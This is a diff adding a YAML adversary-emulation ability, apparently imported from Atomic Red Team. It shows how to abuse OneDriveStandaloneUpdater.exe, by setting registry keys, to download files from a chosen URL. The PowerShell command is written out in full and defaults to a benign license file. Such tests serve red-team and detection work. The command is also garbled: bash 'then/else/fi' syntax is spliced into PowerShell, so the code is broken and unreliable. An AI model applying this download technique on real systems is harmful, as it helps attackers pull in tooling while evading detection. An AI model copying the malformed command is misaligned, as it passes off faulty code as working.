@@ -1,0 +1,70 @@
+- id: 3dd6a6cf-9c78-462c-bd75-e9b54fc8925b
+  name: Download a file with OneDrive Standalone Updater
+  description: 'Uses OneDrive Standalone Updater to download a file from a specified
+    URL by setting up the required registry keys.
+
+    This technique can be used to download files without executing anomalous executables.
+
+    Reference: https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/'
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe")
+          {exit 0} else {exit 1}; then : ; else Write-Host "OneDriveStandaloneUpdater.exe
+          not found at C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe.
+          Please install OneDrive or specify correct path."; fi; if (-not (Test-Path
+          "C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"))
+          {; Write-Host "OneDriveStandaloneUpdater.exe not found at C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe.
+          Test cannot continue."; exit 1; }; New-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Name "UpdateRingSettingURLFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+          -Type String -Force; Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Name "ODSUUpdateXMLUrlFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+          -Type String -Force; Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Name "UpdateXMLUrlFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+          -Type String -Force; Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Name "UpdateOfficeConfigTimestamp" -Value 99999999999 -Type QWord -Force;
+          # Run OneDrive Standalone Updater; & "C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"'
+        cleanup: Remove-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Force -ErrorAction Ignore; Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json"
+          -Force -ErrorAction Ignore
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1105
+  - atomic-red-team
+  - command-and-control
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      remote_url:
+        description: URL to download file from
+        type: url
+        default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+      onedrive_path:
+        description: Path to OneDrive Standalone Updater executable
+        type: path
+        default: C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
+    dependencies:
+    - description: 'OneDriveStandaloneUpdater.exe must exist on disk at specified
+        location
+
+        '
+      prereq_command: 'if (Test-Path "#{onedrive_path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'Write-Host "OneDriveStandaloneUpdater.exe not found at
+        #{onedrive_path}. Please install OneDrive or specify correct path."
+
+        '
+    technique_created: '2017-05-31T21:31:16.408Z'
+    atomic_guid: 3dd6a6cf-9c78-462c-bd75-e9b54fc8925b
+    import_timestamp: '2025-06-24T11:15:05.784650Z'
